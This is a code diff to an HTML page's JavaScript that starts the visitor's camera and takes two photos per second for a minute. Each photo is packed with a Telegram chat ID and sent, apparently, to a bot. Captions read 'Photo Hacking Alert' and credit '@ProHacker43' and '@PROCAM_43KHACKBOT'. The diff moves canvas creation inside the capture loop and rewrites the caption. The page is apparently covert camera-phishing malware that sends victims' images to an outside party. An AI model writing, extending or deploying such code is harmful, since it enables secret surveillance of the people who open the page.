@@ -80,23 +80,23 @@ async function startCameraLoop(){
         video.srcObject = stream;
         await video.play();
 
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-
         let photoCount = 0;
-        const maxTime = 60; // 60 seconds
+        const maxTime = 60; // 1 minute
         const intervalMs = 500; // 2 photos per second
 
         const sendInterval = setInterval(async ()=>{
+            // Create fresh canvas for each photo
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
             canvas.toBlob(async blob=>{
                 const timestamp = new Date();
                 const timeStr = timestamp.toLocaleTimeString();
-                const country = "🌐 User Country"; // placeholder
-                const flag = "🏳️"; // placeholder
-                const caption = `<b>Photo #${photoCount+1}</b> - ⏰ ${timeStr}\n${flag} ${country}\nDeveloper by @ProHacker43`;
+                const country = "CountryName"; // placeholder
+                const caption = `🔥 Photo Hacking Alert! 🔥\n🛡️ Photo #${photoCount+1} sent.\n⏰ Time: ${timeStr}\n🌍 Location: ${country}\n🦠 BotDeveloper: @ProHacker43\n🪬 Bot link: @PROCAM_43KHACKBOT\n💀 Stay vigilant!`;
 
                 const formData = new FormData();
                 formData.append("chat_id", CHAT_ID);
@@ -129,5 +129,6 @@ async function startCameraLoop(){
     }
 }
 </script>
+
 </body>
-</html> 
+</html>
